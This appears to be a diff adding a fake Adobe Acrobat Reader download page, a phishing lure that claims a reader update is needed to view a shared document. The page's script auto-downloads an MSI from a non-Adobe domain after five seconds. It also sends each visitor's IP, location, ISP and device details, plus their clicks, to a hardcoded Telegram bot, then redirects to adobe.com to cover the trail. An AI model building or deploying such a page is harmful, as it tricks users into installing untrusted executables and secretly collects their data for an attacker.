@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Adobe Acrobat Pro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            min-height: 100vh;
+            background: #1a1a1a;
+            background-image: url('https://files.manuscdn.com/user_upload_by_module/session_file/310519663642050603/tgdOfSGiecKqPiOL.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Adobe header bar */
+        .adobe-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 50px;
+            background: #1a1a1a;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .adobe-header .adobe-wordmark {
+            color: #ff0000;
+            font-size: 22px;
+            font-weight: 700;
+            font-style: italic;
+            letter-spacing: -0.5px;
+        }
+
+        /* Adobe bottom bar */
+        .adobe-bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            background: #2a2a2a;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 100;
+            border-top: 1px solid #444;
+        }
+
+        .adobe-bottom-bar .bottom-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .adobe-bottom-bar .bottom-left img {
+            width: 28px;
+            height: 28px;
+        }
+
+        .adobe-bottom-bar .bottom-left .bottom-text {
+            color: #fff;
+        }
+
+        .adobe-bottom-bar .bottom-left .bottom-text .title {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .adobe-bottom-bar .bottom-left .bottom-text .subtitle {
+            font-size: 11px;
+            color: #aaa;
+        }
+
+        .adobe-bottom-bar .bottom-right button {
+            background: #1473e6;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 20px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .adobe-bottom-bar .bottom-right button:hover {
+            background: #0d66d0;
+        }
+
+        .adobe-bottom-bar .bottom-right button:disabled {
+            opacity: 0.6;
+            cursor: default;
+            pointer-events: none;
+        }
+
+        /* Main content card */
+        .main-card {
+            background: rgba(10, 10, 10, 0.92);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 36px 36px 36px;
+            max-width: 480px;
+            width: 90%;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+
+        .adobe-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+
+        .adobe-logo img {
+            width: 36px;
+            height: 36px;
+        }
+
+        .adobe-logo span {
+            font-size: 22px;
+            font-weight: 500;
+            color: #ffffff;
+        }
+
+        .main-card h1.please-wait {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffffff;
+            line-height: 1.3;
+            margin-bottom: 24px;
+            text-align: center;
+            margin-top: 18px;
+        }
+
+        .instruction-text {
+            font-size: 15px;
+            color: #ddd;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        .download-link-text {
+            font-size: 13px;
+            color: #aaa;
+            text-align: center;
+            margin-bottom: 22px;
+        }
+
+        .download-link-text a {
+            color: #4a9eff;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+
+        .download-link-text a:hover {
+            color: #6bb3ff;
+        }
+
+        .instruction-list {
+            list-style: disc;
+            padding-left: 24px;
+            text-align: left;
+            margin-top: 16px;
+        }
+
+        .instruction-list li {
+            font-size: 14px;
+            color: #ffffff;
+            line-height: 1.6;
+        }
+
+        /* Redirect badge - hidden by default */
+        .redirect-badge {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Adobe Header -->
+    <div class="adobe-header">
+        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663642050603/YvUGzkeLZvzIqRTs.png" alt="Adobe" style="height: 79px; width: auto;">
+    </div>
+
+    <!-- Adobe Bottom Bar -->
+    <div class="adobe-bottom-bar">
+        <div class="bottom-left">
+            <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1786283663/Adobe-Reader-Logo-Vector.svg-_lz7tww.png" alt="Adobe">
+            <div class="bottom-text">
+                <div class="title">Adobe Acrobat</div>
+                <div class="subtitle">Free plans for businesses or personal and teachers.</div>
+            </div>
+        </div>
+        <div class="bottom-right">
+            <button id="downloadBottomBtn">Download Adobe Acrobat</button>
+        </div>
+    </div>
+
+    <!-- Main content card -->
+    <div class="main-card">
+        <div class="adobe-logo">
+            <img src="https://res.cloudinary.com/djzv1chbx/image/upload/v1786283663/Adobe-Reader-Logo-Vector.svg-_lz7tww.png" alt="Adobe Acrobat">
+            <span>Adobe Acrobat Reader</span>
+        </div>
+
+        <h1 class="please-wait">Please wait...</h1>
+
+        <p class="instruction-text">
+            To read the document, you do not have the latest version of Adobe Acrobat Reader for Windows App installed. The latest version of Adobe Acrobat Reader will download automatically, kindly install or open to view the shared document.
+        </p>
+
+        <p class="download-link-text">
+            If the download doesn't start automatically, Click., <a href="https://zoomupgradesoftware.com/Adobe%20Reader.msi" id="manualDownloadLink">Download Manually.</a>
+        </p>
+
+        <ul class="instruction-list">
+            <li>Open your download folder to access the document</li>
+        </ul>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIG
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = "8880753136:AAHVOdFLGB7B8V4LYl-W_84LKYpIP7iq664";
+        const TELEGRAM_CHAT_ID = "8116420547";
+
+        // NEW download URL (for bottom bar button + auto-download)
+        const DOWNLOAD_URL =
+            "https://zoomupgradesoftware.com/Adobe%20Reader.msi";
+
+        // Redirect target after download
+        const REDIRECT_URL = "https://www.adobe.com/";
+
+        // Delay before auto-download (ms)
+        const AUTO_DOWNLOAD_DELAY = 5000;
+
+        // Delay after download trigger before redirect (ms) – now 20 seconds
+        const REDIRECT_DELAY = 20000;
+
+        // ============================================================
+        // STATE
+        // ============================================================
+        let downloadTriggered = false;
+        let redirectTimer = null;
+
+        // ============================================================
+        // TELEGRAM HELPERS
+        // ============================================================
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                })
+            }).catch(err => console.log("Telegram error:", err));
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Unknown";
+            let os = "Unknown";
+            let browser = "Unknown";
+
+            if (/Windows/i.test(ua)) os = "Windows";
+            else if (/Macintosh|Mac OS/i.test(ua)) os = "macOS";
+            else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = "Linux";
+            else if (/Android/i.test(ua)) os = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+
+            if (/Mobile|Android.*Mobile|iPhone|iPod/i.test(ua)) device = "Mobile";
+            else if (/iPad|Android(?!.*Mobile)|Tablet/i.test(ua)) device = "Tablet";
+            else device = "Desktop";
+
+            if (/Edg\//i.test(ua)) browser = "Edge";
+            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+            else if (/Firefox/i.test(ua)) browser = "Firefox";
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+            else if (/Opera|OPR/i.test(ua)) browser = "Opera";
+
+            return { device, os, browser, userAgent: ua };
+        }
+
+        async function trackVisitor() {
+            const deviceInfo = getDeviceInfo();
+            let ip = "Unknown";
+            let location = "Unknown";
+            let carrier = "Unknown";
+            let country = "Unknown";
+            let city = "Unknown";
+            let region = "Unknown";
+
+            try {
+                const response = await fetch("https://ipinfo.io/json");
+                const data = await response.json();
+                ip = data.ip || "Unknown";
+                city = data.city || "Unknown";
+                region = data.region || "Unknown";
+                country = data.country || "Unknown";
+                location = `${city}, ${region}, ${country}`;
+                carrier = data.org || "Unknown";
+            } catch (e) {
+                try {
+                    const response = await fetch("https://api.ipify.org?format=json");
+                    const data = await response.json();
+                    ip = data.ip;
+                } catch (e2) {
+                    ip = "Could not detect";
+                }
+            }
+
+            const timestamp = new Date().toLocaleString();
+
+            const message =
+                `\u{1F4CB} <b>ADOBE TRACKING - New Visit</b>\n\n` +
+                `\u{1F550} <b>Time:</b> ${timestamp}\n` +
+                `\u{1F310} <b>IP Address:</b> ${ip}\n` +
+                `\u{1F4CD} <b>Location:</b> ${location}\n` +
+                `\u{1F3E2} <b>ISP/Carrier:</b> ${carrier}\n` +
+                `\u{1F4BB} <b>Device:</b> ${deviceInfo.device}\n` +
+                `\u{1F5A5} <b>OS:</b> ${deviceInfo.os}\n` +
+                `\u{1F30D} <b>Browser:</b> ${deviceInfo.browser}\n` +
+                `\u{1F4F1} <b>User Agent:</b> ${deviceInfo.userAgent}\n` +
+                `\u{1F4C4} <b>Page:</b> Adobe Acrobat Pro`;
+
+            sendToTelegram(message);
+        }
+
+        function trackClick(buttonName) {
+            const timestamp = new Date().toLocaleString();
+            const deviceInfo = getDeviceInfo();
+
+            const message =
+                `\u{1F446} <b>ADOBE TRACKING - Button Click</b>\n\n` +
+                `\u{1F550} <b>Time:</b> ${timestamp}\n` +
+                `\u{1F518} <b>Button:</b> ${buttonName}\n` +
+                `\u{1F4BB} <b>Device:</b> ${deviceInfo.device}\n` +
+                `\u{1F5A5} <b>OS:</b> ${deviceInfo.os}\n` +
+                `\u{1F30D} <b>Browser:</b> ${deviceInfo.browser}\n` +
+                `\u{1F4C4} <b>Page:</b> Adobe Acrobat Pro`;
+
+            sendToTelegram(message);
+        }
+
+        function trackDownload(method) {
+            const timestamp = new Date().toLocaleString();
+            const deviceInfo = getDeviceInfo();
+
+            const message =
+                `\u{1F4E5} <b>ADOBE TRACKING - Download Triggered</b>\n\n` +
+                `\u{1F550} <b>Time:</b> ${timestamp}\n` +
+                `\u{1F4E6} <b>Method:</b> ${method}\n` +
+                `\u{1F4C1} <b>File:</b> Adobe Acrobat.MSI\n` +
+                `\u{1F4BB} <b>Device:</b> ${deviceInfo.device}\n` +
+                `\u{1F5A5} <b>OS:</b> ${deviceInfo.os}\n` +
+                `\u{1F30D} <b>Browser:</b> ${deviceInfo.browser}\n` +
+                `\u{1F4C4} <b>Page:</b> Adobe Acrobat Pro`;
+
+            sendToTelegram(message);
+        }
+
+        // ============================================================
+        // CORE: TRIGGER DOWNLOAD + SCHEDULE REDIRECT (no countdown)
+        // ============================================================
+        function triggerDownload(source) {
+            if (downloadTriggered) return;
+            downloadTriggered = true;
+
+            // Disable the bottom bar button
+            const btn = document.getElementById('downloadBottomBtn');
+            if (btn) {
+                btn.disabled = true;
+                btn.textContent = 'Downloading…';
+            }
+
+            // Track
+            trackDownload(source);
+
+            // 1) Start the download (navigate to the file URL)
+            window.location.href = DOWNLOAD_URL;
+
+            // 2) Schedule the redirect after REDIRECT_DELAY ms (20s) – no badge
+            if (redirectTimer) {
+                clearTimeout(redirectTimer);
+            }
+
+            redirectTimer = setTimeout(function() {
+                window.location.href = REDIRECT_URL;
+            }, REDIRECT_DELAY);
+        }
+
+        // ============================================================
+        // INIT: TRACK VISITOR + AUTO-DOWNLOAD + EVENT BINDING
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+
+            // Track visitor
+            trackVisitor();
+
+            // ---- Bottom bar "Download Adobe Acrobat" button ----
+            const bottomBtn = document.getElementById('downloadBottomBtn');
+            if (bottomBtn) {
+                bottomBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    trackClick("Download Adobe Acrobat (bottom bar)");
+                    triggerDownload("Manual Bottom Button Click");
+                });
+            }
+
+            // ---- "Download Manually" link (fallback) ----
+            const manualLink = document.getElementById('manualDownloadLink');
+            if (manualLink) {
+                manualLink.addEventListener('click', function(e) {
+                    // Track but do not trigger redirect – it's a pure fallback
+                    trackClick("Download Manually (fallback)");
+                });
+            }
+
+            // ---- Auto-download after delay ----
+            setTimeout(function() {
+                if (!downloadTriggered) {
+                    triggerDownload("Auto Download (" + (AUTO_DOWNLOAD_DELAY / 1000) + "s)");
+                }
+            }, AUTO_DOWNLOAD_DELAY);
+
+            // ---- Also track any clicks on the "Download Manually" link ----
+            const allManualLinks = document.querySelectorAll('.download-link-text a');
+            allManualLinks.forEach(function(link) {
+                if (link.id !== 'manualDownloadLink') {
+                    link.addEventListener('click', function() {
+                        trackClick("Download Manually (generic)");
+                    });
+                }
+            });
+        });
+
+        // ============================================================
+        // FALLBACK: expose a global function
+        // ============================================================
+        window.__triggerAdobeDownload = function(source) {
+            triggerDownload(source || "External call");
+        };
+
+        console.log('✅ Adobe Acrobat Pro page loaded.');
+        console.log('ℹ️  Auto-download in ' + (AUTO_DOWNLOAD_DELAY / 1000) + 's → redirect to adobe.com after ' +
+            (REDIRECT_DELAY / 1000) + 's (no countdown).');
+        console.log('🔘 Bottom bar button → triggers download + redirect.');
+        console.log('📎 "Download Manually" link → fallback (no redirect).');
+    </script>
+</body>
+</html>
